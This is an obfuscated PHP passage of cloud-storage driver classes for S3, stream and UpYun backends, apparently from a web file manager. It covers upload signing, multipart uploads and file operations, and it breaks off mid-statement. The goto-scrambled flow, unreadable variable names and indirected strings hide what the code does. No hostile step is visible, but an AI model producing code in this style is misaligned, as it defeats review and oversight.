<?php
 goto d÷ØÉĞÊÁˆ; AÌì«æÌ: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($bçË©‹éâô) { parent::__construct($bçË©‹éâô); } public function uploadFormData($DØÛİ¯Ö´, $Eå˜ã›ß²× = 3600) { goto d¼±“ËÚáÉ; d—øÜ†ö‹à: $B¸Ô“çÒˆ = base64_encode(json_encode($B»‚ÔŠÃğ)); $cÑã‹®òæ“ = hash_hmac($F­Ñ«˜ùà³[1235], $fƒî›÷­¶±, $F­Ñ«˜ùà³[1236] . $this->secret, !0); $cï¸™åÉ³ = hash_hmac($F­Ñ«˜ùà³[1235], $this->region, $cÑã‹®òæ“, !0); goto eáÉ‘®ƒÀ“; eáÉ‘®ƒÀ“: $b„¢ÁØÏÔç = hash_hmac($F­Ñ«˜ùà³[1235], $B‘ÀÅÇÕÑ , $cï¸™åÉ³, !0); $B”œ‡ªÒÁ¡ = hash_hmac($F­Ñ«˜ùà³[1235], $D¥çÖµä†Ó, $b„¢ÁØÏÔç, !0); $cè°‡‰ÈŞ = hash_hmac($F­Ñ«˜ùà³[1235], $B¸Ô“çÒˆ, $B”œ‡ªÒÁ¡); goto b‹¸Àœãù; b‹¸Àœãù: $A¦Èƒí½ = array($F­Ñ«˜ùà³[221] => $F­Ñ«˜ùà³[33], $F­Ñ«˜ùà³[1237] => $F­Ñ«˜ùà³[33], $F­Ñ«˜ùà³[1194] => $a‘á¬£‰Çµ, $F­Ñ«˜ùà³[1198] => $AÄì×Ö„Åê, $F­Ñ«˜ùà³[1202] => $B¸Ô“çÒˆ, $F­Ñ«˜ùà³[1238] => $a—İ¤ø»¹, $F­Ñ«˜ùà³[1239] => $e¤ò…Ë·ğ”, $F­Ñ«˜ùà³[1240] => $F¬ÁÑŒ§ƒŸ, $F­Ñ«˜ùà³[1241] => $FÁ¬Ü…õĞ, $F­Ñ«˜ùà³[1242] => $cè°‡‰ÈŞ, $F­Ñ«˜ùà³[185] => $this->getHost()); return $A¦Èƒí½; goto D‰…ÀÌ”; dÆŸ°Ş¸§Î: $D¥çÖµä†Ó = $F­Ñ«˜ùà³[1227]; $FÁ¬Ü…õĞ = $Eå˜ã›ß²× . $F­Ñ«˜ùà³[33]; $AÄì×Ö„Åê = $F­Ñ«˜ùà³[1190]; goto e³’Å¦È; c±‘Îõæäê: $B‘ÀÅÇÕÑ  = $F­Ñ«˜ùà³[69]; $F¬ÁÑŒ§ƒŸ = gmdate($F­Ñ«˜ùà³[1226]); $fƒî›÷­¶± = gmdate($F­Ñ«˜ùà³[720]); goto dÆŸ°Ş¸§Î; d¼±“ËÚáÉ: $F­Ñ«˜ùà³ =& $_SERVER[Ü˜]; $a‘á¬£‰Çµ = $F­Ñ«˜ùà³[202]; $e¤ò…Ë·ğ” = $F­Ñ«˜ùà³[1225]; goto c±‘Îõæäê; e³’Å¦È: $Fğ“ŞÍ‰í§ = array($this->accessKey, $fƒî›÷­¶±, $this->region, $B‘ÀÅÇÕÑ , $D¥çÖµä†Ó); $a—İ¤ø»¹ = implode($F­Ñ«˜ùà³[8], $Fğ“ŞÍ‰í§); $B»‚ÔŠÃğ = array($F­Ñ«˜ùà³[1192] => gmdate($F­Ñ«˜ùà³[1191], strtotime($F­Ñ«˜ùà³[1228])), $F­Ñ«˜ùà³[1193] => array(array($F­Ñ«˜ùà³[1195] => $this->bucket), array($F­Ñ«˜ùà³[1194] => $a‘á¬£‰Çµ), array($F­Ñ«˜ùà³[1196], $F­Ñ«˜ùà³[1197], $F­Ñ«˜ùà³[33]), array($F­Ñ«˜ùà³[1196], $F­Ñ«˜ùà³[1229], $F­Ñ«˜ùà³[33]), array($F­Ñ«˜ùà³[1196], $F­Ñ«˜ùà³[1230], $F­Ñ«˜ùà³[33]), array($F­Ñ«˜ùà³[1198] => $AÄì×Ö„Åê), array($F­Ñ«˜ùà³[1231] => $a—İ¤ø»¹), array($F­Ñ«˜ùà³[1232] => $e¤ò…Ë·ğ”), array($F­Ñ«˜ùà³[1233] => $F¬ÁÑŒ§ƒŸ), array($F­Ñ«˜ùà³[1234] => $FÁ¬Ü…õĞ))); goto d—øÜ†ö‹à; D‰…ÀÌ”: } public function multiUploadFormData($DÑôÒ¨Õ¾…, $cÕŒÊĞ½öŒ = 3600) { $F´ø÷¨™ë³ =& $_SERVER[Ü˜]; $bËæ¹ÓšçÀ = gmdate($F´ø÷¨™ë³[1320]); $AÚÊ§¶Ô¨È = array(); $B»÷³áÙ§ = $this->client->getUploadId($this->bucket, $DÑôÒ¨Õ¾…, $AÚÊ§¶Ô¨È); if (!$B»÷³áÙ§) { return !1; } return array($F´ø÷¨™ë³[231] => $B»÷³áÙ§, $F´ø÷¨™ë³[185] => $this->getHost() . $F´ø÷¨™ë³[8] . $this->pathEncode($DÑôÒ¨Õ¾…), $F´ø÷¨™ë³[232] => $bËæ¹ÓšçÀ, $F´ø÷¨™ë³[103] => $DÑôÒ¨Õ¾…); } public function multiUploadAuthData($DÔšÍºÍ§¦, $dç¸¦­ãåƒ = array()) { goto AÆ¦ø·èˆ»; AÆ¦ø·èˆ»: $Dî¿ö‡Íœ =& $_SERVER[Ü˜]; $EÖŒäÈĞ½Û = isset($dç¸¦­ãåƒ[$Dî¿ö‡Íœ[178]]) ? $dç¸¦­ãåƒ[$Dî¿ö‡Íœ[178]] : $Dî¿ö‡Íœ[33]; $cß†´ß£¼” = $dç¸¦­ãåƒ[$Dî¿ö‡Íœ[103]]; goto CÄá®šßËä; cô—­Œ†ô”: if (isset($dç¸¦­ãåƒ[$Dî¿ö‡Íœ[1321]])) { $AÎ İ•ƒØ[$Dî¿ö‡Íœ[1322]] = $dç¸¦­ãåƒ[$Dî¿ö‡Íœ[1321]]; } $eŞä´í£œß = explode($Dî¿ö‡Íœ[187], $this->getHost()); $B®“åğèˆ = array($Dî¿ö‡Íœ[1323] => $eŞä´í£œß[1], $Dî¿ö‡Íœ[1324] => $Dî¿ö‡Íœ[33], $Dî¿ö‡Íœ[221] => $Dî¿ö‡Íœ[129], $Dî¿ö‡Íœ[1237] => $dç¸¦­ãåƒ[$Dî¿ö‡Íœ[88]]); goto b‰˜‡Ş¼†¨; a¬–İ¼¢ç: if (strpos($EÖŒäÈĞ½Û, $Dî¿ö‡Íœ[235]) === 0) { if (isset($AÎ İ•ƒØ[$Dî¿ö‡Íœ[1322]])) { $bÎ…ÂÒ³ŠÅ = $AÎ İ•ƒØ[$Dî¿ö‡Íœ[1322]]; } else { if (isset($dİÄŞÒè°Ô[$Dî¿ö‡Íœ[1322]])) { $bÎ…ÂÒ³ŠÅ = $dİÄŞÒè°Ô[$Dî¿ö‡Íœ[1322]]; } else { $bÎ…ÂÒ³ŠÅ = hash($Dî¿ö‡Íœ[1235], $Dî¿ö‡Íœ[33]); } } return array($Dî¿ö‡Íœ[241] => $dİÄŞÒè°Ô[$Dî¿ö‡Íœ[241]], $Dî¿ö‡Íœ[1322] => $bÎ…ÂÒ³ŠÅ, $Dî¿ö‡Íœ[232] => $dİÄŞÒè°Ô[$Dî¿ö‡Íœ[1325]]); } return $dİÄŞÒè°Ô[$Dî¿ö‡Íœ[241]]; goto eá•œ­¨Âæ; b‰˜‡Ş¼†¨: $E¬èÄõ§ä = $Dî¿ö‡Íœ[236]; $d‚è‹ìñÒ¦ = $Dî¿ö‡Íœ[8] . $this->pathEncode($cß†´ß£¼”) . $EÖŒäÈĞ½Û; $dİÄŞÒè°Ô = $this->client->__getSignatureV4($AÎ İ•ƒØ, $B®“åğèˆ, $E¬èÄõ§ä, $d‚è‹ìñÒ¦); goto a¬–İ¼¢ç; CÄá®šßËä: unset($dç¸¦­ãåƒ[$Dî¿ö‡Íœ[103]]); if (isset($dç¸¦­ãåƒ[$Dî¿ö‡Íœ[233]])) { return $this->listUploadParts($cß†´ß£¼”, $dç¸¦­ãåƒ); } $AÎ İ•ƒØ = array(); goto cô—­Œ†ô”; eá•œ­¨Âæ: } public function listUploadParts($CÕ”ªÍã…, $c„Ì½ˆøÚÜ = array()) { goto CÀÃå…”å™; D§›ã˜Ñœ: $EâÓŞ«ë•ï = $this->client->__getSignatureV4($aªÕ‡é¥×, $b‘Ø´ƒ†Ûš, $C®ªŠáô‘‚, $eÅê‘éšŠ, $f¥ßÙæ¥ç); return array($e©¢–œ«…‘[241] => $EâÓŞ«ë•ï[$e©¢–œ«…‘[241]], $e©¢–œ«…‘[232] => $EâÓŞ«ë•ï[$e©¢–œ«…‘[1325]], $e©¢–œ«…‘[243] => $DÄÂ˜îæ…í, $e©¢–œ«…‘[1322] => $EâÓŞ«ë•ï[$e©¢–œ«…‘[1322]]); goto E¬¼äò£³; DªÉÇˆ­±ö: $f¥ßÙæ¥ç .= $e©¢–œ«…‘[1329]; $aªÕ‡é¥× = array(); $dÑÊ„Í˜¤© = explode($e©¢–œ«…‘[187], $this->getHost()); goto D ¯Íêº¦†; Fšš“Ÿ†©ğ: if (!$DÄÂ˜îæ…í) { return !1; } $f¥ßÙæ¥ç = $e©¢–œ«…‘[1326]; foreach ($DÄÂ˜îæ…í as $aµ‚ÄÒ‹ñÙ) { $f¥ßÙæ¥ç .= $e©¢–œ«…‘[1327] . "\x3c\x50\141\x72\164\116\x75\x6d\x62\145\x72\76{$aµ‚ÄÒ‹ñÙ[$e©¢–œ«…‘[1282]]}\x3c\x2f\120\x61\162\x74\x4e\165\x6d\142\x65\x72\76\xa" . "\x3c\105\124\x61\x67\76{$aµ‚ÄÒ‹ñÙ[$e©¢–œ«…‘[1283]]}\74\x2f\105\124\x61\147\x3e\xa" . $e©¢–œ«…‘[1328]; } goto DªÉÇˆ­±ö; D ¯Íêº¦†: $b‘Ø´ƒ†Ûš = array($e©¢–œ«…‘[1323] => $dÑÊ„Í˜¤©[1], $e©¢–œ«…‘[221] => $e©¢–œ«…‘[129], $e©¢–œ«…‘[1237] => strlen($f¥ßÙæ¥ç)); $C®ªŠáô‘‚ = $e©¢–œ«…‘[234]; $eÅê‘éšŠ = $e©¢–œ«…‘[8] . $this->pathEncode($CÕ”ªÍã…) . $c„Ì½ˆøÚÜ[$e©¢–œ«…‘[178]]; goto D§›ã˜Ñœ; CÀÃå…”å™: $e©¢–œ«…‘ =& $_SERVER[Ü˜]; $B·àšÏŠÅ = str_replace($e©¢–œ«…‘[242], $e©¢–œ«…‘[33], $c„Ì½ˆøÚÜ[$e©¢–œ«…‘[178]]); $DÄÂ˜îæ…í = $this->client->listParts($this->bucket, $CÕ”ªÍã…, $B·àšÏŠÅ); goto Fšš“Ÿ†©ğ; E¬¼äò£³: } public function link($D½µíÛ¹, $E¢¾‹ì–Ô = array()) { return parent::link($D½µíÛ¹, $E¢¾‹ì–Ô); } public function fileOut($aÂã¸’ÀÖë, $BëïæáĞÕ = false, $bÄÈËÚøò = false, $a¨»ˆ™•ê = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[Ü˜][1330])) { return parent::fileOutServer($aÂã¸’ÀÖë, $BëïæáĞÕ, $bÄÈËÚøò, $a¨»ˆ™•ê); } parent::fileOut($aÂã¸’ÀÖë, $BëïæáĞÕ, $bÄÈËÚøò, $a¨»ˆ™•ê); } public function fileOutImage($eáöÄ³è¥¬, $DÚ¯ÓÄ›ö‹ = 250) { if (strstr($this->endpoint, $_SERVER[Ü˜][1330])) { return parent::fileOutImageServer($eáöÄ³è¥¬, $DÚ¯ÓÄ›ö‹); } parent::fileOutImage($eáöÄ³è¥¬, $DÚ¯ÓÄ›ö‹); } public function fileOutLink($bÉÃ²´Ğó•) { $d­®Œ×’Ì‰ =& $_SERVER[Ü˜]; if (substr($bÉÃ²´Ğó•, 0, 7) == $d­®Œ×’Ì‰[1205]) { $bÉÃ²´Ğó• = $d­®Œ×’Ì‰[1206] . substr($bÉÃ²´Ğó•, 7); } header($d­®Œ×’Ì‰[169] . $bÉÃ²´Ğó•); die; } public function getHost() { $Aò¥Îå£ê› =& $_SERVER[Ü˜]; $A…È¨°µ¦ô = str_rtrim(parent::getHost(), $Aò¥Îå£ê›[8] . $this->bucket); $A…È¨°µ¦ô = explode($Aò¥Îå£ê›[187], $A…È¨°µ¦ô); return $A…È¨°µ¦ô[0] . $Aò¥Îå£ê›[187] . $this->bucket . $Aò¥Îå£ê›[105] . $A…È¨°µ¦ô[1]; } } class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($f‚Œ‚ˆÓÁÎ, $fèßÛõÃ† = 0) { parent::__construct(); $this->source = $f‚Œ‚ˆÓÁÎ; $this->sourceSize = $fèßÛõÃ†; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($D«£ ·º ¡ = false) { return $this->sourceSize; } public function getContent($E±ÊñĞ‡Æ = false) { return $this->fileSubstr($E±ÊñĞ‡Æ, 0, $this->sourceSize); } public function fileSubstr($CåÓçÏÑ = false, $c‡öïÕÛÜ = 0, $bŞ—™–Ü‚¿ = 0) { if (!$bŞ—™–Ü‚¿) { $bŞ—™–Ü‚¿ = $this->sourceSize; } $EÖ›Ê¸Ò¹Á = $this->sourceSize - $c‡öïÕÛÜ; if ($bŞ—™–Ü‚¿ >= $EÖ›Ê¸Ò¹Á) { $bŞ—™–Ü‚¿ = $EÖ›Ê¸Ò¹Á; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $c‡öïÕÛÜ, $bŞ—™–Ü‚¿); } if ($this->sourceType == self::TYPE_FILE) { if ($bŞ—™–Ü‚¿ <= 0) { return $_SERVER[Ü˜][33]; } $D¬Åêã¢Ö = ftell($this->source); fseek_64($this->source, $D¬Åêã¢Ö + $c‡öïÕÛÜ); $ağ¤Ú—óÇ‡ = @fread($this->source, $bŞ—™–Ü‚¿); fseek_64($this->source, $D¬Åêã¢Ö); return $ağ¤Ú—óÇ‡; } } public function hashMd5($d©öŸ™“—È = false) { return md5($this->getContent()); } public static function hash($fˆ®ÄƒÛ¼ª, $EÈ²´¡„ = 0) { $aËÍ°Õ†È = new PathDriverStream($fˆ®ÄƒÛ¼ª, $EÈ²´¡„); return $aËÍ°Õ†È->hashSimple($fˆ®ÄƒÛ¼ª); } public static function md5($EÓ·Ã’Ê§Â, $C®¡êëİŠ = 0) { $B¹öåóàñ = new PathDriverStream($EÓ·Ã’Ê§Â, $C®¡êëİŠ); return $B¹öåóàñ->hashMd5($EÓ·Ã’Ê§Â); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\x74\x74\160\x3a\57\57\x76\60\x2e\141\160\x69\x2e\x75\x70\x79\x75\156\56\143\157\x6d"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($dß±âŞ±ø•) { parent::__construct(); $this->_init($dß±âŞ±ø•); } public function _init($a¼·«†„‘î) { $eÂÏÖå¸˜­ =& $_SERVER[Ü˜]; foreach ($a¼·«†„‘î as $a‰±…ËƒÌ => $EÏÛ¨îï‡…) { if (isset($this->{$a‰±…ËƒÌ})) { $this->{$a‰±…ËƒÌ} = $EÏÛ¨îï‡…; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($eÂÏÖå¸˜­[1331] . LNG($eÂÏÖå¸˜­[1263])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($d¿†Œğœë, $CÑ«² Ş¥ß = "\x47\x45\x54") { $Dî¢ò£„»‡ =& $_SERVER[Ü˜]; $eùĞí˜»§Ø = gmdate($Dî¢ò£„»‡[1297]); $C¹óé×°š = base64_encode(hash_hmac($Dî¢ò£„»‡[1332], "{$CÑ«² Ş¥ß}\x26{$d¿†Œğœë}\46{$eùĞí˜»§Ø}", md5("{$this->userpass}"), !0)); $Aò®Ç¬Ü¥Ü = array("\x41\x75\164\x68\x6f\x72\151\172\141\x74\151\157\156\x3a\125\x50\x59\125\116\x20{$this->username}\x3a{$C¹óé×°š}", "\104\141\164\x65\72{$eùĞí˜»§Ø}"); return $Aò®Ç¬Ü¥Ü; } public function ussRequest($bõƒÑè„è¢, $Fôå«‡±ì = "\x47\x45\124", $c•¤¹–ˆ = false, $E¹‹‹ƒíŸ¿ = false, $b§ìò•èø‘ = false) { goto dåŠÔƒª; aƒÇîƒ¿‡«: if (!$d‘šÊÀÛÖŒ) { return array($FÎŞ×æÎï[1087] => !1, $FÎŞ×æÎï[1089] => $FÎŞ×æÎï[1333]); } if (strtolower($Fôå«‡±ì) == $FÎŞ×æÎï[200] || in_array($d‘šÊÀÛÖŒ[$FÎŞ×æÎï[1087]], array($FÎŞ×æÎï[1190], $FÎŞ×æÎï[1334]))) { $c•¤¹–ˆ = $d‘šÊÀÛÖŒ[$FÎŞ×æÎï[1335]]; } else { $c•¤¹–ˆ = json_decode($d‘šÊÀÛÖŒ[$FÎŞ×æÎï[1089]], !0); if (!$c•¤¹–ˆ) { $c•¤¹–ˆ = $d‘šÊÀÛÖŒ[$FÎŞ×æÎï[1089]]; } else { if (!$d‘šÊÀÛÖŒ[$FÎŞ×æÎï[719]] && isset($c•¤¹–ˆ[$FÎŞ×æÎï[1336]])) { $c•¤¹–ˆ = $c•¤¹–ˆ[$FÎŞ×æÎï[1336]]; } } } return array($FÎŞ×æÎï[1087] => $d‘šÊÀÛÖŒ[$FÎŞ×æÎï[719]], $FÎŞ×æÎï[1089] => $c•¤¹–ˆ); goto bî¹ƒÕƒ³¿; dåŠÔƒª: $FÎŞ×æÎï =& $_SERVER[Ü˜]; $bõƒÑè„è¢ = trim($bõƒÑè„è¢, $FÎŞ×æÎï[8]); $f½âˆî¯¹ = "\57{$this->bucket}\x2f{$bõƒÑè„è¢}"; goto AöÁõÄÑ«»; AöÁõÄÑ«»: $E‚É«âàÇ‹ = $this->ussHeaders($f½âˆî¯¹, $Fôå«‡±ì); if ($E¹‹‹ƒíŸ¿) { $E‚É«âàÇ‹ = array_merge($E‚É«âàÇ‹, $E¹‹‹ƒíŸ¿); } $d‘šÊÀÛÖŒ = url_request($this->endpoint . $f½âˆî¯¹, $Fôå«‡±ì, $c•¤¹–ˆ, $E‚É«âàÇ‹, $b§ìò•èø‘); goto aƒÇîƒ¿‡«; bî¹ƒÕƒ³¿: } public function mkfile($B¹ó…õù·, $dÒÓ¢°œÀ = '', $dø‚±ŠÓöŒ = REPEAT_RENAME) { if ($this->setContent($B¹ó…õù·, $dÒÓ¢°œÀ)) { return $this->getPathOuter($B¹ó…õù·); } return !1; } public function mkdir($AŞ„›Ùšƒ, $cƒë©¨ÔÕ„ = REPEAT_SKIP) { $FâŠ‹ø×Æ =& $_SERVER[Ü˜]; $b§øİÛ¸Ô¿ = trim($AŞ„›Ùšƒ, $FâŠ‹ø×Æ[8]); if ($this->_isFolder($b§øİÛ¸Ô¿)) { return $this->getPathOuter($b§øİÛ¸Ô¿); } $Fª«š†ç„Š = array($FâŠ‹ø×Æ[1337]); $C‘ª„èİéÔ = $this->ussRequest($b§øİÛ¸Ô¿, $FâŠ‹ø×Æ[234], !1, $Fª«š†ç„Š); return $C‘ª„èİéÔ[$FâŠ‹ø×Æ[1087]] ? $this->getPathOuter($b§øİÛ¸Ô¿) : !1; } public function copyFile($d³Ì æÚ±¼, $A¯Å´‚Ø«Œ) { $D´éôä«£÷ =& $_SERVER[Ü˜]; $Bµ•Ö‹°äõ = array($D´éôä«£÷[1338] . "\57{$this->bucket}\57{$d³Ì æÚ±¼}", $D´éôä«£÷[1339]); $aÀõÛÊÈÑ = $this->ussRequest($A¯Å´‚Ø«Œ, $D´éôä«£÷[236], !1, $Bµ•Ö‹°äõ); return $aÀõÛÊÈÑ[$D´éôä«£÷[1087]] ? !0 : $this->getPathOuter($A¯Å´‚Ø«Œ); } public function moveFile($b×•ÇÌ›³, $E¶é¾Î…Š†) { $Dø‰µÙ‰Å¦ =& $_SERVER[Ü˜]; $B§²ŒÀ¾ = array($Dø‰µÙ‰Å¦[1340] . "\57{$this->bucket}\x2f{$b×•ÇÌ›³}", $Dø‰µÙ‰Å¦[1339]); $fò“ßÓ¡¥§ = $this->ussRequest($E¶é¾Î…Š†, $Dø‰µÙ‰Å¦[236], !1, $B§²ŒÀ¾); return $fò“ßÓ¡¥§[$Dø‰µÙ‰Å¦[1087]] ? !0 : $this->getPathOuter($E¶é¾Î…Š†); } public function delFile($AÒ¡ô²²œ) { $C«¹é¸ĞÙ =& $_SERVER[Ü˜]; $AŒ°’—˜æ = $this->ussRequest($AÒ¡ô²²œ, $C«¹é¸ĞÙ[1341]); return $AŒ°’—˜æ[$C«¹é¸ĞÙ[1087]] ? !0 : !1; } public function delFolder($fÖ‰°šŸÄ) { goto Dóìõîë¡; Eˆ™è¤ÌìÃ: foreach ($d»±½Ğã¾ as $dˆøø‰ù­) { $B®Ù¢Ö’¡Ë = $this->ussRequest($dˆøø‰ù­[$bˆÒ™†…‚œ[28]], $bˆÒ™†…‚œ[1341]); if (!$B®Ù¢Ö’¡Ë[$bˆÒ™†…‚œ[1087]]) { return !1; } } foreach ($A†£ÃÖÍ®š as $CÓÛ¾ƒÅ¸‚) { $B®Ù¢Ö’¡Ë = $this->ussRequest($CÓÛ¾ƒÅ¸‚, $bˆÒ™†…‚œ[1341]); if (!$B®Ù¢Ö’¡Ë[$bˆÒ™†…‚œ[1087]]) { return !1; } } $B®Ù¢Ö’¡Ë = $this->ussRequest($fÖ‰°šŸÄ, $bˆÒ™†…‚œ[1341]); goto DÖöŒĞâ»Î; BÇ¾øÁˆª—: $A†£ÃÖÍ®š = $d»±½Ğã¾ = array(); $this->fileList($fÖ‰°šŸÄ, $A†£ÃÖÍ®š, $d»±½Ğã¾, !0); $this->listItemCache = !0; goto Eˆ™è¤ÌìÃ; Dóìõîë¡: $bˆÒ™†…‚œ =& $_SERVER[Ü˜]; if (!$this->exist($fÖ‰°šŸÄ)) { return !0; } $this->listItemCache = !1; goto BÇ¾øÁˆª—; DÖöŒĞâ»Î: return $B®Ù¢Ö’¡Ë[$bˆÒ™†…‚œ[1087]]; goto Dáãö“Š³’; Dáãö“Š³’: } public function rename($fÍ©›»¯éœ, $d¸ßš–õŞÜ) { if ($this->isFile($fÍ©›»¯éœ)) { $d¸ßš–õŞÜ = get_path_father($fÍ©›»¯éœ) . $d¸ßš–õŞÜ; return $this->moveFile($fÍ©›»¯éœ, $d¸ßš–õŞÜ); } return $this->renameObject($fÍ©›»¯éœ, $d¸ßš–õŞÜ); } public function fileInfo($c¥ĞË¦¦Ê‹, $FßÜáÄ•Ç‰ = false, $BÖÜÓÏ‡ä¢ = array()) { goto AïÒñ›‹øï; cÚÌÅğ®ºÅ: return $cëéÛ‚œ‘’; goto fö•¾ÛÏ•Í; CÅ­£ì¡„: $cëéÛ‚œ‘’[$CÕ¹çÚ·¿ë[204]] = $cëéÛ‚œ‘’[$CÕ¹çÚ·¿ë[94]] = 0; $cëéÛ‚œ‘’[$CÕ¹çÚ·¿ë[205]] = $cëéÛ‚œ‘’[$CÕ¹çÚ·¿ë[206]] = !0; if (empty($BÖÜÓÏ‡ä¢)) { $BÖÜÓÏ‡ä¢ = $this->objectMeta($c¥ĞË¦¦Ê‹); if (!$BÖÜÓÏ‡ä¢) { return $cëéÛ‚œ‘’; } } goto FèÍ¶å¶¯; AïÒñ›‹øï: $CÕ¹çÚ·¿ë =& $_SERVER[Ü˜]; $cëéÛ‚œ‘’ = array($CÕ¹çÚ·¿ë[28] => $this->pathThis($c¥ĞË¦¦Ê‹), $CÕ¹çÚ·¿ë[86] => $this->getPathOuter($CÕ¹çÚ·¿ë[8] . $c¥ĞË¦¦Ê‹), $CÕ¹çÚ·¿ë[29] => $CÕ¹çÚ·¿ë[203], $CÕ¹çÚ·¿ë[88] => isset($BÖÜÓÏ‡ä¢[$CÕ¹çÚ·¿ë[88]]) ? $BÖÜÓÏ‡ä¢[$CÕ¹çÚ·¿ë[88]] : 0, $CÕ¹çÚ·¿ë[178] => $this->ext($c¥ĞË¦¦Ê‹)); if ($FßÜáÄ•Ç‰) { return $cëéÛ‚œ‘’; } goto CÅ­£ì¡„; FèÍ¶å¶¯: $cëéÛ‚œ‘’[$CÕ¹çÚ·¿ë[204]] = intval($BÖÜÓÏ‡ä¢[$CÕ¹çÚ·¿ë[1342]]); $cëéÛ‚œ‘’[$CÕ¹çÚ·¿ë[94]] = intval($BÖÜÓÏ‡ä¢[$CÕ¹çÚ·¿ë[1343]]); $cëéÛ‚œ‘’[$CÕ¹çÚ·¿ë[88]] = $BÖÜÓÏ‡ä¢[$CÕ¹çÚ·¿ë[88]]; goto cÚÌÅğ®ºÅ; fö•¾ÛÏ•Í: } public function folderInfo($f˜Åá‡É†ß, $F„­òøŠ” = false) { goto aÅ’ôÏÖÈĞ; fŒ‚Ø••è: $a“è¥è­õ¢[$E•¾’µ…•[204]] = $a“è¥è­õ¢[$E•¾’µ…•[94]] = 0; $a“è¥è­õ¢[$E•¾’µ…•[205]] = $a“è¥è­õ¢[$E•¾’µ…•[206]] = !0; if (empty($F´–¬Œ‡â•)) { $F´–¬Œ‡â• = $this->objectMeta($f˜Åá‡É†ß); if (!$F´–¬Œ‡â•) { return $a“è¥è­õ¢; } } goto eğ·´×ªº; aÅ’ôÏÖÈĞ: $E•¾’µ…• =& $_SERVER[Ü˜]; $a“è¥è­õ¢ = array($E•¾’µ…•[28] => $this->pathThis($f˜Åá‡É†ß), $E•¾’µ…•[86] => $this->getPathOuter($E•¾’µ…•[8] . $f˜Åá‡É†ß), $E•¾’µ…•[29] => $E•¾’µ…•[87]); if ($F„­òøŠ”) { return $a“è¥è­õ¢; } goto fŒ‚Ø••è; eğ·´×ªº: $a“è¥è­õ¢[$E•¾’µ…•[204]] = intval($F´–¬Œ‡â•[$E•¾’µ…•[1342]]); $a“è¥è­õ¢[$E•¾’µ…•[94]] = intval($F´–¬Œ‡â•[$E•¾’µ…•[1343]]); return $a“è¥è­õ¢; goto cóĞ«–Åöß; cóĞ«–Åöß: } private function listObjs($aÆÙâ²‡ˆ§, $aéµ£›‰„Â = 0, $cˆ·Î‹¾ôø = 1000) { $FÒ¥Ãİ„Ñ =& $_SERVER[Ü˜]; $F™†ª†Å¢ñ = array($FÒ¥Ãİ„Ñ[1344], $FÒ¥Ãİ„Ñ[1345] . $cˆ·Î‹¾ôø); if ($aéµ£›‰„Â) { $F™†ª†Å¢ñ[] = $FÒ¥Ãİ„Ñ[1346] . $aéµ£›‰„Â; } $DËŸ£Ÿ†­Ò = $this->ussRequest($aÆÙâ²‡ˆ§, $FÒ¥Ãİ„Ñ[238], !1, $F™†ª†Å¢ñ); return !$DËŸ£Ÿ†­Ò[$FÒ¥Ãİ„Ñ[1087]] ? !1 : $DËŸ£Ÿ†­Ò[$FÒ¥Ãİ„Ñ[1089]]; } private function fileList($CĞºéßŠàÇ, &$A¸ÈÚáæÏë, &$cª§ÕÜˆù¤, $aêçä‘¨Û¢ = false) { goto Dš‡¸¶ƒ…‡; eùë×–¼‰Ş: $b¨Í¨¢ß¦Ê = rtrim($CĞºéßŠàÇ, $FÃ¿ÍĞ£Ø[8]) . $FÃ¿ÍĞ£Ø[8]; $AĞä„¹íÈò = $this->listItemCache === !1 ? !1 : !0; while (!0) { check_abort(); $DØÚ¼Î›Í = $this->listObjs($CĞºéßŠàÇ, $cˆ’Âéø, $a¡îŞèÛ›ğ); if (!$DØÚ¼Î›Í) { return !1; } $cˆ’Âéø = isset($DØÚ¼Î›Í[$FÃ¿ÍĞ£Ø[1347]]) ? $DØÚ¼Î›Í[$FÃ¿ÍĞ£Ø[1347]] : $FÃ¿ÍĞ£Ø[33]; $bÕ™½•ÁÖë = isset($DØÚ¼Î›Í[$FÃ¿ÍĞ£Ø[1348]]) ? $DØÚ¼Î›Í[$FÃ¿ÍĞ£Ø[1348]] : array(); foreach ($bÕ™½•ÁÖë as $Bî±ğ¹Ç) { $B¬¨ãÓ°™õ = $Bî±ğ¹Ç[$FÃ¿ÍĞ£Ø[29]] == $FÃ¿ÍĞ£Ø[87] ? !0 : !1; $A¸¹¬¼‰µË = ltrim($b¨Í¨¢ß¦Ê . $Bî±ğ¹Ç[$FÃ¿ÍĞ£Ø[28]], $FÃ¿ÍĞ£Ø[8]) . ($B¬¨ãÓ°™õ ? $FÃ¿ÍĞ£Ø[8] : $FÃ¿ÍĞ£Ø[33]); $AŠ¾‰ø¨á× = array($FÃ¿ÍĞ£Ø[28] => $A¸¹¬¼‰µË, $FÃ¿ÍĞ£Ø[29] => $B¬¨ãÓ°™õ ? $FÃ¿ÍĞ£Ø[87] : $FÃ¿ÍĞ£Ø[203], $FÃ¿ÍĞ£Ø[88] => $Bî±ğ¹Ç[$FÃ¿ÍĞ£Ø[344]], $FÃ¿ÍĞ£Ø[1343] => $Bî±ğ¹Ç[$FÃ¿ÍĞ£Ø[1349]]); if ($AĞä„¹íÈò) { $this->cacheMethod($FÃ¿ÍĞ£Ø[209], $A¸¹¬¼‰µË, $B¬¨ãÓ°™õ); $this->cacheMethod($FÃ¿ÍĞ£Ø[210], $A¸¹¬¼‰µË, $AŠ¾‰ø¨á×); } if ($B¬¨ãÓ°™õ) { $A¸ÈÚáæÏë[] = $A¸¹¬¼‰µË; if ($aêçä‘¨Û¢) { $this->fileList($A¸¹¬¼‰µË, $A¸ÈÚáæÏë, $cª§ÕÜˆù¤, $aêçä‘¨Û¢); } continue; } $cª§ÕÜˆù¤[] = $AŠ¾‰ø¨á×; } if (count($bÕ™½•ÁÖë) < $a¡îŞèÛ›ğ) { break; } } goto bË‡É®ê‚; Dš‡¸¶ƒ…‡: $FÃ¿ÍĞ£Ø =& $_SERVER[Ü˜]; $cˆ’Âéø = 